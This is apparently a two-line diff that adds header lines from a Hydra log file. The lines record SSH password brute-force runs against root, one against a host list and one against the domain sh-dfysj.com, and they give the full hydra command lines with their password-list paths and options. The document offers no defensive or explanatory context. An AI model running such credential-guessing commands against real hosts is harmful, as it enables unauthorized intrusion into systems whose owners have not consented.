@@ -1,0 +1,2 @@
+# Hydra v9.2 run at 2026-07-30 01:44:05 on /tmp/ssh_hosts.txt ssh (hydra -M /tmp/ssh_hosts.txt -l root -P /tmp/ftp_pass.txt -t 4 -w 5 -o /tmp/hydra_ssh.txt ssh)
+# Hydra v9.2 run at 2026-08-05 04:35:30 on sh-dfysj.com ssh (hydra -l root -P /tmp/pw.txt -t 4 -W 5 -f -o /tmp/hydra_ssh.txt ssh://sh-dfysj.com)
